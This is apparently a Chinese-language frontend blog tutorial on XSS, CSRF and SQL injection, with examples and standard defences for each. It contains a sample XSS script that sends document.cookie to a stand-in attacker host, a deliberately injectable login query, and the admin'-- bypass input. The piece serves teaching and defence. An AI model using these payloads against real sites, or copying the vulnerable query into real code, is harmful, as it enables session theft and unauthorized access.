```yaml
title: web常见的攻击方式
date: 2023-10-22
categories: 前端技术
tags: [Web,http]
```

# web常见的攻击方式

## 一、是什么

Web攻击是针对用户上网行为或网站服务器等设备进行攻击的行为。如植入恶意代码，修改网站权限，获取网站用户隐私信息，破坏数据完整性或服务可用性等等。

Web应用程序的安全性是任何基于Web业务的重要组成部分。

一些常见的Web攻击包括：

1. 跨站脚本攻击（XSS）

2. 跨站请求伪造（CSRF）

3. SQL注入

## 二、跨站脚本攻击（XSS）

XSS，是一种常见的网络安全漏洞，攻击者利用这种漏洞向网页中注入恶意脚本，使得用户在访问这些网页时受到攻击。

**例子**：

假设有一个论坛网站存在XSS漏洞，攻击者在一个帖子的评论框中注入以下恶意脚本：

```html
<script>
  fetch('http://attacker-website.com/?cookie=' + document.cookie);
</script>

```

当其他用户浏览包含这个评论的帖子时，恶意脚本会将用户的Cookie信息发送到攻击者控制的服务器，攻击者就可以用这些信息进行进一步的攻击。

**分类**：

XSS攻击通常分为三种类型：存储型XSS，反射型XSS和DOM型XSS。

1. 存储型XSS：攻击者将恶意脚本存储在目标网站的数据库中，如上述例子，当用户访问包含这些恶意脚本的页面时，恶意脚本会被执行。这种攻击通常会导致用户数据泄漏、会话劫持等问题。

2. 反射型XSS：攻击者构造包含恶意脚本的URL，诱使用户点击这个URL，服务器将恶意脚本反射到游湖的浏览器中执行。这种攻击通常需要诱使用户点击特制的恶意链接。

3. DOM型XSS：这种类型的XSS攻击不涉及服务器端，而是利用前端JS代码中的漏洞，在用户浏览器中执行恶意脚本，攻击者可以通过修改页面的DOM结构来实施攻击，从而盗取用户信息或执行其他恶意操作。

**防御方法**：

1. 输入验证和过滤：对用户输入的数据进行验证和过滤，确保不接受恶意脚本。

2. 输出编码：在将用户输入数据输出到网页时，使用合适的编码方式，如HTML编码等，防止恶意脚本执行。

3. 使用安全的Cookie标记：设置Cookie的HttpOnly和Secure属性，防止被恶意脚本获取和篡改。

## 三、跨站请求伪造（CSRF）

CSRF是一种常见的网络攻击方式，它利用用户已经认证过的会话来在过户不知情的情况下执行非预期的操作。攻击者通常会诱使受害者在已经登录过的网站上点击恶意链接或访问恶意网站，从而触发对受害者账户的操作。

**例子**：

假设用户已经登录了他们的银行账户，并且银行网站存在一个漏洞，允许攻击者构造恶意链接或页面。

攻击者在一个恶意网站上放置了一个精心设计的页面，其中包含一个指向银行网站转账页面的恶意请求。攻击者通过各种方式诱使用户访问这个恶意页面，比如发送诱人的电子邮件或社交媒体消息。一旦用户访问了恶意页面，妻子的恶意请求会自动向银行发送一个转账请求，利用了用户在银行网站的已认证会话。由于用户已经在银行网站上保持了登录状态，银行网站会误认为这个转账请求是用户自己发起的，从而执行转账操作，将资金转移到攻击者控制的账户中。

**防御方法**：

1. CSRF令牌：在关键操作（比如转账）的请求中包含一个CSRF令牌，确保请求是合法的，而不是来自恶意页面。

2. 同源策略：浏览器的同源策略限制了一个网站在未经用户授权的情况下无法访问另一个网站的资源。

3. 验证来源：应用程序应该验证请求的来源，确保请求来自合法的网站而不是恶意站点。

4. 安全的Cookie策略：使用HttpOnly和Secure标志来保护Cookie，防止被恶意脚本访问。

# 四、SQL注入

SQL注入是一种常见的网络安全攻击，攻击者利用应用程序对用户输入数据的处理不当，向应用程序的数据库发送恶意的SQL查询，以获取未授权的数据或执行未经授权的操作。

**例子**：

假设有一个简单的网站，用户可以通过用户名和密码登录。网站的登录验证是通过以下SQL查询实现的：

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

攻击者发现该网站存在SQL注入漏洞，他可以在用户名和密码字段中输入以下内容：

- 用户名：`admin'--`

- 密码：任意密码(不需要)

当应用程序将用户名和密码插入到SQL查询中时，查询变为：

```sql
SELECT * FROM users WHERE username='admin'--' AND password=''
```

由于`--`是SQL中的注释符号，它后面的所有内容都被注释掉了，因此查询实际变成了：

```sql
SELECT * FROM users WHERE username='admin'
```

由于该查询只检查用户名而不检查密码，攻击者成功绕过了密码验证，以管理员身份登录到系统中，获取了管理员权限。

**防御方法**：

1. 参数化查询：使用参数化查询或存储过程来处理数据库查询，确保用户输入不会被解释成SQL代码。

2. 输入验证和过滤：对用户输入数据进行验证和过滤，确保只有预期的数据类型和格式被接受。

3. 错误信息处理：避免向用户返回详细的错误信息，攻击者可以利用这些信息进一步猜测和利用漏洞。
